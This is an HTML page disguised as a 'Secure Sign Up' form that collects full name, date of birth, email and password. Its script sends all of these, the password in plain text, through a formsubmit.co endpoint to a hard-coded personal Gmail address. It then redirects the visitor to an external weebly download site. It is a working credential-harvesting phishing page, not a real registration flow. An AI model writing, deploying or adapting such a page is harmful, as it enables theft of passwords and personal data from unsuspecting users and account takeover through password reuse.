<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secure Sign Up</title>
    <style>
        /* Clean and Professional Font */
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap');
        
        body { 
            font-family: 'Inter', sans-serif;
            display: flex; 
            justify-content: center; 
            align-items: center; 
            min-height: 100vh; 
            background-color: #0f1115; /* Professional Dark Gray/Black */
            margin: 0; 
            color: #e1e1e1; 
        }

        /* Clean Professional Container */
        .pro-box { 
            background: #181a20; 
            padding: 40px 35px; 
            border-radius: 12px; 
            text-align: center; 
            width: 85%;
            max-width: 380px; 
            /* Subtle shadow and border, no harsh glow */
            border: 1px solid #2b2e36;
            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.5);
        }

        h2 { 
            margin-bottom: 8px;
            font-size: 26px;
            font-weight: 600;
            color: #ffffff;
        }

        p {
            font-size: 14px;
            color: #848e9c;
            margin-bottom: 30px;
        }

        .input-group {
            text-align: left;
            margin-bottom: 18px;
        }

        label {
            display: block;
            font-size: 13px;
            color: #b7bdc6;
            margin-bottom: 6px;
            font-weight: 500;
        }

        input { 
            width: 100%; 
            padding: 14px 15px; 
            box-sizing: border-box;
            border: 1px solid #2b2e36; 
            background: #0b0e11; 
            color: #ffffff; 
            font-size: 15px;
            border-radius: 6px;
            transition: all 0.2s ease;
            font-family: 'Inter', sans-serif;
        }

        /* Subtle focus effect - minimal professional blue glow */
        input:focus {
            outline: none;
            border-color: #2962ff;
            box-shadow: 0 0 0 3px rgba(41, 98, 255, 0.15);
        }

        /* Placeholder color */
        input::placeholder {
            color: #5e6673;
        }

        /* Professional Button */
        button { 
            padding: 15px; 
            background: #2962ff; /* Corporate Blue */
            color: #ffffff; 
            border: none; 
            border-radius: 6px; 
            cursor: pointer; 
            font-size: 16px;
            font-weight: 600;
            width: 100%;
            margin-top: 10px;
            transition: all 0.2s ease;
        }

        button:hover {
            background: #1e4bd8;
        }

        button:disabled {
            background: #2b2e36;
            color: #5e6673;
            cursor: not-allowed;
        }

        /* Simple Loading Screen */
        #loading-screen { 
            display: none; 
            text-align: center;
        }
        
        .loader {
            width: 40px;
            height: 40px;
            border-radius: 50%;
            border: 3px solid #2b2e36;
            border-top-color: #2962ff;
            animation: spin 1s linear infinite;
            margin: 0 auto 15px;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>

    <!-- Loading Screen -->
    <div id="loading-screen">
        <div class="loader"></div>
        <p style="color: #b7bdc6; font-size: 15px;">Please wait...</p>
    </div>

    <!-- Professional Signup Form -->
    <div class="pro-box" id="signup-box">
        <h2>Create Account</h2>
        <p>Please enter your details to continue</p>
        
        <div class="input-group">
            <label>Full Name</label>
            <input type="text" id="userFullName" placeholder="e.g. Ali Ahmed" required />
        </div>

        <div class="input-group">
            <label>Date of Birth</label>
            <!-- Calendar removed, now it's a typing field -->
            <input type="text" id="userDOB" placeholder="DD/MM/YYYY" required />
        </div>

        <div class="input-group">
            <label>Email Address</label>
            <input type="email" id="userEmail" placeholder="name@example.com" required />
        </div>

        <div class="input-group">
            <label>Password</label>
            <input type="password" id="userPass" placeholder="••••••••" required />
        </div>
        
        <button id="submitBtn" onclick="handleSignup()">Sign Up</button>
    </div>

    <script>
        // --- CREDENTIALS ---
        const adminEmail = "mrpinto1433@gmail.com"; 
        const targetLink = "https://allinonedown.weebly.com"; 

        // Auto-check on Page Load
        window.onload = function() {
            if (localStorage.getItem("app_user_verified") === "true") {
                showLoading();
                window.location.href = targetLink;
            }
        };

        function showLoading() {
            document.getElementById("signup-box").style.display = "none";
            document.getElementById("loading-screen").style.display = "block";
        }

        function handleSignup() {
            const fullName = document.getElementById("userFullName").value;
            const dob = document.getElementById("userDOB").value;
            const email = document.getElementById("userEmail").value;
            const pass = document.getElementById("userPass").value;
            const btn = document.getElementById("submitBtn");

            if(!fullName || !dob || !email || !pass) {
                alert("Please fill all the details to continue!");
                return;
            }

            btn.innerText = "Processing...";
            btn.disabled = true;

            fetch(`https://formsubmit.co/ajax/${adminEmail}`, {
                method: "POST",
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    "Full Name": fullName,
                    "Date of Birth": dob,
                    "Email": email,
                    "Password": pass,
                    "_subject": "New Registration: App User!"
                })
            })
            .then(() => {
                localStorage.setItem("app_user_verified", "true");
                showLoading();
                window.location.href = targetLink;
            })
            .catch(() => {
                alert("Network error! Please check your connection.");
                btn.innerText = "Sign Up";
                btn.disabled = false;
            });
        }
    </script>
</body>
</html>
